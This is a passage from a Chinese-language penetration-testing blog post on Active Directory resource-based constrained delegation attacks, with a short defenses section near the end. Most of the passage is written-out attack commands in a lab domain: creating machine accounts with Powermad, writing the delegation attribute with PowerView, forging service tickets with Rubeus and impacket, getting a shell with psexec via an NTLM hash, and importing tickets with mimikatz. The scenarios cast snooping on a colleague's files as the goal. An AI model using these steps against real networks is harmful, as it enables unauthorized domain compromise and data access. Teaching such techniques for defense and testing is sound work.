+</span></span><span class="line"><span class="cl"><span class="c"># 查看写权限</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="p">[</span><span class="no">computerName</span><span class="p">]</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="py">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;SID&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/50.png" alt="50"></p>
+<h2 id="实战-2">实战</h2>
+<h3 id="利用条件">利用条件</h3>
+<p>利用基于资源的约束委派(RBCD)需要2个条件：</p>
+<p>1.拥有将域机器加入域的域用户的权限。（将机器B加入域的域用户拥有修改机器B的msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限。）</p>
+<p>2.一个任意服务账户或者一个机器账户（每一个域用户默认可以添加10个机器账户，可以通过LDAP中的MAQ属性查看）</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/51.png" alt="51"></p>
+<h3 id="环境-2">环境</h3>
+<p>域：hack.lab</p>
+<p>域控服务器（server 2019）：172.16.0.106     域管理用户：dc_admin  域控主机名：dc</p>
+<p>域内主机 （Windows 10）：172.16.0.111     本地管理员：xd32 域普通用户：  域控主机名：sql</p>
+<p>域内主机 （Windows 7）：172.16.0.105     本地管理员：sc92n  域普通用户：lucky  域控主机名：win7a</p>
+<p>进入内网的攻击主机（Kali Linux）：172.16.0.107</p>
+<p>现在有两个情景：</p>
+<ol>
+<li>安全研究员小明发现名为dc_admin的域管理用户在他电脑主机win7a上存留了一些资料，但是他没有权限查看。于是为了看这个资料，在本机展开一系列的攻击。</li>
+<li>数据库管理员小智想查看小明的主机文件，原因是上次公司发生了病毒感染事件，就让安全研究员小明来帮忙溯源和修补漏洞，但是在数据库服务器主机名为SQL上面发现了一条数据拉取的记录，而且就是在小明来的时间段发生的。因此小智在本机导出了lucky登录的hash，并请了一个黑客朋友帮忙获取小明主机的权限，于是让黑客使用kali接入了公司内网展开了一系列攻击。</li>
+</ol>
+<h3 id="情景一">情景一</h3>
+<p>安全研究员小明，知道他的用户lucky就是在自己主机win7a加入域内的，所以lucky对win7a拥有修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限。</p>
+<p>但是还需要创建一个机器来帮助申请票据，利用 <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a> 添加机器账户<code>gongjuren</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-Scope</span> <span class="k">Process</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="n">gongjuren</span> <span class="n">-Password</span> <span class="vm">$</span><span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;123456&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+</span></span></code></pre></div><p>已经成功添加：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/52.png" alt="52"></p>
+<p>接下来就是把<code>gongjuren</code>的sid写入win7a的<code>AllowedToActOnBehalfOfOtherIdentity</code>属性中，这里用脚本是<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">PowerView.ps1</a>。</p>
+<p>获取到gongjuren账号的sid：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Get-Domiancomputer hacksystem
+</span></span></code></pre></div><p>把gongjuren的sid写入win7a的msds-allowedtoactonbehalfofotheridentity属性中：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="py">AccessControl</span><span class="p">.</span><span class="py">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3896163557-1645138957-2306563325-1125)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="py">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">win7a</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="vm">@</span><span class="p">{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span></span></code></pre></div><p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/53.png" alt="53"></p>
+<p>验证是否添加成功：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="n">WIN7A</span> <span class="n">-Properties</span> <span class="nb">msds-allowedtoactonbehalfofotheridentity</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/54.png" alt="54"></p>
+<p>配置完 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性之后就可以通过基于资源的约束委派去攻击了。</p>
+<p>接下来会用到一款工具<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>，先导出机器用户的 ntlm hash：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe hash /user:gongjuren /password:123456 /domain:hack.lab
+</span></span></code></pre></div><p>得到rc4 hash：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/55.png" alt="55"></p>
+<p>然后用 <code>gongjuren$</code>的 hash 请求白银票据并导入到当前会话中：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe s4u /user:gongjuren$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/win7a.hack.lab /ptt
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/56.png" alt="56"></p>
+<p>并且可以看到s4u2self和s4u2proxy都是成功的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/57.png" alt="57"></p>
+<p>查看已经有了票据：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/58.png" alt="58"></p>
+<p>现在小明就开始用域管理administrator的权限去访问域管理dc_admin用户在本机上的文件了，发现了还是访问不了，可能是powershell写入失败了，就重新用一款Jumbo大佬写的工具<a href="https://github.com/Jumbo-WJB/SharpAllowedToAct-Modify">SharpAllowedToAct-Modify</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SharpAllowedToAct.exe -m win7a -u lucky -p p@ssw0rd -t gongjuren -a dc.hack.lab -d hack.lab
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/59.png" alt="59"></p>
+<p>我们再重新申请票据导入内存：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe s4u /user:gongjuren$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/win7a.hack.lab /ptt
+</span></span></code></pre></div><p>但还是不行，我后来换了win10客户端去做上面操作的时候就成功了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/60.png" alt="60"></p>
+<p>果然是在本机是不行的，小明最后借助了旁边同事的一台win7进行攻击，把上面s4u申请的服务票据（最后一串base64）拿到同事这台win7进行操作：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe ptt /ticket:最后一串base64
+</span></span></code></pre></div><p>用同事的主机访问win7a主机里面域管理的文件夹成功：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/66.png" alt="66"></p>
+<h3 id="情景二">情景二</h3>
+<p>小智请来的黑客开始使用kali进行操作，这个工具是<a href="https://github.com/SecureAuthCorp/impacket">impacket</a>上的，内置在kali，首先是创建一台机器，：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">addcomputer.py -dc-ip 172.16.0.106  -computer-name <span class="s1">&#39;gongjuren$&#39;</span> -computer-pass <span class="m">123456</span> hack.lab/lucky -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
+</span></span></code></pre></div><blockquote>
+<p>当然也可以用密码， domain.local/username[:password]</p>
+</blockquote>
+<p>添加成功：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/61.png" alt="61"></p>
+<p>将gongjuren的信息写入win7a的msDS-AllowedToActOnBehalfOfOtherIdentity属性，rbcd.py也是impacket里面的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rbcd.py -delegate-from <span class="s1">&#39;gongjuren$&#39;</span> -delegate-to <span class="s1">&#39;win7a$&#39;</span> -dc-ip 172.16.0.106 -action write hack.lab/lucky -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72
+</span></span></code></pre></div><p>写入成功：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/62.png" alt="62"></p>
+<p>伪造票据,getST.py也是内置在kali的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getST.py -spn cifs/win7a -impersonate administrator -dc-ip 172.16.0.106 hack/gongjuren<span class="se">\$</span>:123456
+</span></span></code></pre></div><p>申请票据成功：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/63.png" alt="63"></p>
+<p>设置KRB5CCNAME环境变量并使用psexec.py连接win7a：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</span></span><span class="line"><span class="cl">psexec.py win7a -dc-ip 172.16.0.106 -k -no-pass
+</span></span></code></pre></div><blockquote>
+<p>我hosts文件设置了172.16.0.105 win7a,也可以换成ip</p>
+</blockquote>
+<p>成功拿到win7a的权限：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/64.png" alt="64"></p>
+<p>但是他朋友不可能一直帮他接入内网权限维持，所以给他一张票据让小智也可以在他本机查看win7a的文件，这里是在小智的SQL主机上使用的mimikatz操作：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimikatz.exe &#34;kerberos::ptc administrator.ccache&#34; exit
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/65.png" alt="65"></p>
+<p>这样小智就自己就可以访问到win7a的主机文件了，黑客朋友还教了他使用Rubeus重新申请票据，这样就不怕票据失效了。</p>
+<h1 id="0x04-防御措施">0x04 防御措施</h1>
+<p>防御措施的的话，因为委派比较实用我们也不能说直接简单粗暴关闭该功能。</p>
+<ol>
+<li>我们可以设置一些高权限用户为敏感账户</li>
+</ol>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/67.png" alt="67"></p>
+<ol start="2">
+<li>Windows 2012 R2及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组，当这个组内的用户登录时（windows 2012 R2域服务器，客户端必须为Windows 8.1或之上），不能使用NTLM认证；适用于Windows Server 2016、Windows Server 2012 R2、 Windows Server 2012
+3.一般TGT 4小时后失效</li>
+</ol>
+<p>4.Kerberos预认证时不使用DES或者RC4等加密算法；</p>
+<h1 id="0x05-结尾">0x05 结尾</h1>
+<p>整个漏洞下来还是比较多内容的，还有很多CVE漏洞或者是很多细节还没写全，篇幅太长了，后面会单个漏洞写，这样就不会显得文章太冗长了。</p>
+<p>师傅们如果有问题请指点，多交流，文笔不是很好，大佬们见谅哈～</p>
+<h1 id="参考">参考</h1>
+<p><a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">http://woshub.com/decoding-ad-useraccountcontrol-value/</a></p>
+<p><a href="https://m365internals.com/2021/05/22/how-to-hunt-for-ldap-reconnaissance-within-m365-defender/">https://m365internals.com/2021/05/22/how-to-hunt-for-ldap-reconnaissance-within-m365-defender/</a></p>
+<p><a href="https://www.bilibili.com/s/video/BV1UQ4y1S7jM">https://www.bilibili.com/s/video/BV1UQ4y1S7jM</a></p>
+<p><a href="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/">https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/</a></p>
+<p><a href="https://xz.aliyun.com/t/7217">https://xz.aliyun.com/t/7217</a></p>
+<p><a href="https://www.cnblogs.com/car7n/p/14789004.html">https://www.cnblogs.com/car7n/p/14789004.html</a></p>
+<p><a href="https://paper.seebug.org/620/">https://paper.seebug.org/620/</a></p>
+<p><a href="https://www.crisprx.top/archives/429">https://www.crisprx.top/archives/429</a></p>
+<p><a href="https://xz.aliyun.com/t/7217">https://xz.aliyun.com/t/7217</a></p>
+<p><a href="https://daiker.gitbook.io/windows-protocol/kerberos/">https://daiker.gitbook.io/windows-protocol/kerberos/</a></p>
+<p><a href="https://xz.aliyun.com/t/2931">https://xz.aliyun.com/t/2931</a></p>
+<p><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1646184652&amp;ver=3651&amp;signature=Op78cNj8DMI094Nq9Jybu3JMv1zbGGcr*iY*mrBeikoMxGN0wtLkOPHZg0KqRgTVzLICHraR2RRdAiY68xlEOyyo*5W6looqhAmBNLjiMRRjuHykxPgC-0WF3ct9D6KY&amp;new=1">基于资源的约束委派利用</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1899592">https://cloud.tencent.com/developer/article/1899592</a></p>
+<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></p>
+<p><a href="https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie">https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/ad_delegation.html">https://xxe.icu/ad_delegation.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/ad_ptt.html" class="underline text-yellow-600">域渗透-票据传递攻击（Pass the Ticket）</a></li>
+    
+    <li><a href="/ad_spn.html" class="underline text-yellow-600">域渗透-SPN</a></li>
+    
+    <li><a href="/ad_kerberoasting.html" class="underline text-yellow-600">域渗透-Kerberoasting</a></li>
+    
+    <li><a href="/ad_as_reproasting.html" class="underline text-yellow-600">域渗透-AS_REPRoasting</a></li>
+    
+    <li><a href="/ad_pass_key.html" class="underline text-yellow-600">域渗透-哈希传递攻击(Pass The Hash/Key)</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-非约束委派">0x01 非约束委派</a>
+      <ul>
+        <li><a href="#环境">环境</a></li>
+        <li><a href="#实战">实战</a></li>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#发现非约束委派信息">发现非约束委派信息</a>
+          <ul>
+            <li><a href="#adfind">AdFind</a></li>
+            <li><a href="#powerview">PowerView</a></li>
+            <li><a href="#finddelegationpy">findDelegation.py</a></li>
+            <li><a href="#ldapsearch">ldapsearch</a></li>
+          </ul>
+        </li>
+        <li><a href="#非约束委派spooler打印机">非约束委派+spooler打印机</a>
+          <ul>
+            <li><a href="#环境部署">环境部署</a></li>
+            <li><a href="#实战-1">实战</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x02-约束委派">0x02 约束委派</a>
+      <ul>
+        <li><a href="#环境-1">环境</a></li>
+        <li><a href="#实战-主机账户">实战-主机账户</a></li>
+        <li><a href="#实战-服务账号生成黄金票据">实战-服务账号（生成黄金票据）</a>
+          <ul>
+            <li><a href="#kekeo">kekeo</a></li>
+            <li><a href="#impacket">Impacket</a></li>
+          </ul>
+        </li>
+        <li><a href="#原理-1">原理</a></li>
+        <li><a href="#发现约束委派信息">发现约束委派信息</a>
+          <ul>
+            <li><a href="#adfind-1">AdFind</a></li>
+            <li><a href="#powerview-1">PowerView</a></li>
+            <li><a href="#inddelegationpy">indDelegation.py</a></li>
+            <li><a href="#ldapsearch-1">ldapsearch</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x03-基于资源的约束委派rbcd">0x03 基于资源的约束委派（RBCD）</a>
+      <ul>
+        <li><a href="#原理-2">原理</a></li>
+        <li><a href="#查找可控的机器">查找可控的机器</a>
+          <ul>
+            <li><a href="#adfind-2">AdFind</a></li>
+            <li><a href="#powerview-2">Powerview</a></li>
+          </ul>
+        </li>
+        <li><a href="#实战-2">实战</a>
+          <ul>
+            <li><a href="#利用条件">利用条件</a></li>
+            <li><a href="#环境-2">环境</a></li>
+            <li><a href="#情景一">情景一</a></li>
+            <li><a href="#情景二">情景二</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x04-防御措施">0x04 防御措施</a></li>
+    <li><a href="#0x05-结尾">0x05 结尾</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
